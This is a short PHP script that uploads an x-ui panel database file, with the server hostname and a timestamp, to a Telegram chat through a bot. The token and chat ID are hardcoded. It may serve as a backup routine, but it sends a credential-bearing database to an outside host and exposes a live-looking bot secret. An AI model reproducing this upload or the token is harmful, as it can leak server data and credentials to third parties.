<?php
define('API_KEY','5630492156:AAHQLx_Sp-oGGkVDIiOs4G5vOH48-vhHTBk');
define('chat_id','-1001915433579');
define('domain',gethostname());
function makeCURL($method , $args=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
    $ch = curl_init($url);
    $optArray = [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $args,
        CURLOPT_RETURNTRANSFER => true
    ];
    curl_setopt_array($ch , $optArray);
    $result = json_decode(curl_exec($ch));
    curl_close($ch);
    return $result;
}
makeCURL('sendDocument',['chat_id'=>chat_id,'document'=>new \CURLFile(__DIR__.'/../x-ui.db', 'text/plain', __DIR__.'/../x-ui.db'),'caption'=>domain.PHP_EOL.PHP_EOL.date('Y/m/d H:i:s')]);
?>
